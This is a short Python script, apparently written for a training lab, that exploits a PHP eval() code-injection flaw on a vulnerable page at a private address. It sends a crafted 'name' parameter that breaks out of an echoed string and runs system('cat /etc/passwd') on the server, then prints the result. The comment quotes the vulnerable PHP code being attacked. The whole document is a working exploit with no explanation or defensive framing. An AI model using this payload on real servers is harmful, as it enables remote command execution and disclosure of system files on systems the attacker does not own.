import urllib.parse
import urllib.request
import lxml.html as lh




# $str="echo \"Hello ".$_GET['name']."!!!\";";
# eval($str);

payload = {"name": " Tai\";system('cat /etc/passwd'); echo \" "}
payload = urllib.parse.urlencode(payload)

url = "http://10.0.1.14/codeexec/example1.php?"+payload
print(url)

with urllib.request.urlopen(url) as reponse:
	content = reponse.read()
print(content)

